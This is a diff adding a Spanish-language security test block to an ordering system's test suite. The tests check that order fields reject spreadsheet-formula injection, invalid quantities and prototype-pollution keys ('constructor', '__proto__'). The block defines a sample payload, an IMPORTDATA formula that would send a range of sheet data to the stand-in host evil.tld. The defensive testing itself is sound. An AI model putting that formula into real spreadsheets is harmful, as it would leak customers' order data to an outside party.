@@ -932,5 +932,40 @@ console.log('\nAL ENTREGAR, EL TELEFONO SE LIGA SOLO A LA CUENTA QUE PIDIO');
   comparar('un pedido de invitado no liga', ctx.duenoDeTelefono_(TEL_I), '');
 }
 
+console.log('\nLO QUE MANDA EL NAVEGADOR NO ENTRA COMO FORMULA NI COMO PRECIO RARO');
+{
+  const intentarPedido = (extra, items) => {
+    RELOJ = diaAbierto();
+    try {
+      return ctx.crearOrden_(Object.assign({
+        canal: 'Web', cliente: { telefono: '5544440001', nombre: 'Prueba seguridad' },
+        direccion: 'Calle 1', colonia: 'Lomas Lindas', km: 1, pago_metodo: 'Efectivo',
+        items: items || [{ producto_id: 'roni', cantidad: 1 }],
+      }, extra || {}));
+    } catch (e) { return String(e.message || e); }
+  };
+  const FORMULA = '=IMPORTDATA("https://evil.tld/?"&TEXTJOIN("|",TRUE,D2:G3000))';
+
+  const conCanal = intentarPedido({ canal: FORMULA });
+  comparar('un canal inventado se guarda como Web, no como formula', campoDe(conCanal.folio, 'canal'), 'Web');
+  comparar('los canales reales se respetan', campoDe(intentarPedido({ canal: 'App' }).folio, 'canal'), 'App');
+  comparar('sin importar mayusculas', campoDe(intentarPedido({ canal: 'whatsapp' }).folio, 'canal'), 'WhatsApp');
+
+  comparar('un km con formula se guarda vacio', campoDe(intentarPedido({ km: FORMULA }).folio, 'km'), '');
+  comparar('un km real se guarda como numero', campoDe(intentarPedido({ km: '2.345' }).folio, 'km'), 2.35);
+
+  const conCantidad = (c) => intentarPedido({}, [{ producto_id: 'roni', cantidad: c }]);
+  comparar('una cantidad con decimales se rechaza', /Cantidad inválida/.test(conCantidad(1.01)), true);
+  comparar('cero se rechaza', /Cantidad inválida/.test(conCantidad(0)), true);
+  comparar('mas de 20 se rechaza', /Cantidad inválida/.test(conCantidad(21)), true);
+  comparar('sin cantidad, se cobra una', totalDe(conCantidad(undefined).folio), 189);
+  comparar('una cantidad escrita como texto entero vale', typeof conCantidad('2').folio, 'string');
+
+  comparar('constructor no es un producto', /Producto desconocido/.test(intentarPedido({}, [{ producto_id: 'constructor', cantidad: 1 }])), true);
+  comparar('__proto__ tampoco', /Producto desconocido/.test(intentarPedido({}, [{ producto_id: '__proto__', cantidad: 1 }])), true);
+  comparar('ni como complemento', /Complemento desconocido/.test(intentarPedido({},
+    [{ producto_id: 'roni', cantidad: 1, addons: [{ id: 'constructor' }] }])), true);
+}
+
 console.log('\n  ' + ok + ' pruebas ok, ' + mal + ' mal\n');
 process.exit(mal ? 1 : 0);
